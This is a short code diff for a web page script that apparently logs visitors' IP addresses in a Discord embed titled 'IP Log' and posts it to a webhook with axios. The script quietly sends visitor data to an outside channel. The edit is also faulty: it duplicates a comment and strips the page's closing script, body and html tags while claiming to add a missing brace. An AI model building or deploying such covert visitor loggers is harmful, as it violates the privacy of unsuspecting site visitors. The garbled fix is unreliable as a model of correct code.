@@ -41,6 +41,7 @@
         // get the Discord webhook URL from the meta tag
         const webhookUrl = document.querySelector('meta[name="discord-webhook"]').content;
   // create the embed message
+  // create the embed message
   const embed = {
     title: 'IP Log',
     description: `
@@ -71,6 +72,4 @@
   // send the embed message to the Discord channel
   axios.post(webhookUrl, {
     embeds: [embed],
-  </script>
-</body>
-</html>
+  });  // <-- this is the missing closing curly brace
